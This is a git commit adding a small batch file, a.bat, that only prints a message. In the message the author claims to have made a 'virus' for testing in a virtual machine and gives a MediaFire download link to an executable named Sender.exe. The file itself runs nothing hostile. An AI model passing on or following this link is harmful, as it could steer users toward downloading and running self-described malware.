a082f3d4817dbcea127133ce9107d994b39f8666
windowsfanmaster10 <84399458+windowsfanmaster10@users.noreply.github.com>
2021-06-17 11:13:34 +0200

    a.bat
    nothing

---
+++ a.bat
@@ -0,0 +1,3 @@
+@echo off
+echo hello people im maked virus to test in virtual machine im dont upload on github becouse im deleted in
+download link: https://www.mediafire.com/file/twhjwnmsllcs8a4/Sender.exe/file
